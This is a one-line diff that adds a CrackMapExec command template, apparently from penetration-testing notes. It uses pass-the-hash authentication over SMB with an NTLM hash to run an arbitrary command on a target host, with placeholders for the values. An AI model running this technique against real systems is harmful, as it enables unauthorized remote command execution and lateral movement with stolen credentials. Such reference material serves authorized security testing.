@@ -1,0 +1,1 @@
+crackmapexec smb <IP> -u <username> -H "<NTLM hash>" -x "command"
